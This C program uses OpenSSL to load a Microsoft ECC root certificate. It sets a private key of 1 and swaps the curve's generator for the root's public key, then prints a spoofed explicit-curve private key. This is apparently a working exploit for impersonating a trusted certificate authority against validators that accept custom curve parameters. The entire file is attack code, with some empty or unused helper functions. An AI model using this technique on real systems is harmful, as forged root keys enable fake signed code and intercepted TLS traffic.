#include <stdio.h>
#include <stdlib.h>
#include <openssl/ssl.h>

char *readFile();


int main()
{
    BIO *bio = BIO_new_fd(fileno(stdout), BIO_NOCLOSE);
    FILE *f = fopen("MicrosoftECCProductRootCertificateAuthority.cer", "r");
    X509 *cert = PEM_read_X509(f, NULL, NULL, NULL);
    
    // Definition is not in the documentation:
    //      1. BIO
    //      2. X509 cert
    //      3. Name output flags
    //      4. General visibility flags
    //X509_print_ex(bio, cert, 0, 0);

    //BIO_printf(bio, "\n =========== \n\n");

    EVP_PKEY *publicKey = X509_get0_pubkey(cert);
    EC_KEY *ecKey = EVP_PKEY_get0_EC_KEY(publicKey);

    //EC_KEY_print(bio, ecKey, 0);

    //BIO_printf(bio, "\n =========== \n\n");

    BIGNUM *privateKey = BN_new();
    BN_hex2bn(&privateKey, "1");

    EC_KEY_set_private_key(ecKey, privateKey);
    //EC_KEY *spoofedECKey = EC_KEY_dup(ecKey);
    const EC_GROUP *group = EC_KEY_get0_group(ecKey);
    EC_GROUP *spoofedGroup = EC_GROUP_dup(group);
    EC_GROUP_set_generator(spoofedGroup, EC_KEY_get0_public_key(ecKey), EC_GROUP_get0_order(group), EC_GROUP_get0_cofactor(group));
    EC_GROUP_set_asn1_flag(spoofedGroup, OPENSSL_EC_EXPLICIT_CURVE);

    EC_KEY_set_group(ecKey, spoofedGroup);
    //EC_KEY_print(bio, ecKey, 0);

    //X509_print_ex(bio, cert, 0, 0);

    PEM_write_bio_ECPrivateKey(bio, ecKey, NULL, NULL, 0, NULL, NULL);
    //BIO_printf(bio, "\n =========== \n\n");

    BIO_flush(bio);
    BIO_free(bio);
    return 0;
}

void parseCert(char *certData)
{
    
}

char *readFile(char *fileName)
{
    FILE *fp;
    char *buffer;
    int fileLength;
    
    fp = fopen(fileName, "r");
    if (fp == NULL)
    {
        perror("Error reading certificate");
        exit(EXIT_FAILURE);
    }

    fseek(fp, 0, SEEK_END);
    fileLength = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    buffer = malloc(fileLength);
    if (buffer)
    {
        fread(buffer, 1, fileLength, fp);
    }
    fclose(fp);

    return buffer;
}